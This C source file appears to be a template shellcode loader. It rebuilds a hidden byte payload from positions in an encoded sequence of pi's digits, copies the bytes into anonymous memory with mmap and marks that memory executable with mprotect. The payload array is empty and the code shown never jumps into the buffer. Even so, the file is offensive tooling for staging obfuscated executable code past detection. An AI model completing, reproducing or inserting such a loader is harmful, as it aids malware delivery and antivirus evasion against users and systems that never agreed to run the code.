#include "../pi.h"

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

void decode_pi_locations(const uint16_t* locations, size_t location_count, uint8_t* output) {
    PiEncoder encoder;
    PiDecoder decoder;
    
    pi_encoder_init(&encoder);
    pi_decoder_init(&decoder, &encoder);
    
    for (size_t i = 0; i < location_count; i++) {
        output[i] = pi_decoder_get(&decoder, locations[i]);
    }
}

/* UNCOMMENT IF DEBUGGING!
void print_decoded_pi(const uint8_t* output, size_t length) {
    printf("DECODED PI VALUES (HEX):\n");
    for (size_t i = 0; i < length; i++) {
        printf("%02x ", output[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");
}
*/

int main() {
    uint16_t locations[] = {

    };
    size_t location_count = sizeof(locations) / sizeof(locations[0]);

    long page_size = sysconf(_SC_PAGESIZE);
    size_t aligned_size = (location_count + page_size - 1) & ~(page_size - 1);
    
    uint8_t* output = (uint8_t*)malloc(location_count);
    if (!output) {
        return 1;
    }

    decode_pi_locations(locations, location_count, output);
    
    /* DEBUG ONLY
    print_decoded_pi(output, location_count);
    */
    
    void *mem = mmap(NULL, aligned_size,
                    PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS,
                    -1, 0);
    
    if (mem == MAP_FAILED) {
        free(output);
        return 1;
    }

    memcpy(mem, output, location_count);
    free(output);

    if (mprotect(mem, aligned_size, PROT_READ | PROT_EXEC) == -1) {
        munmap(mem, aligned_size);
        return 1;
    }
}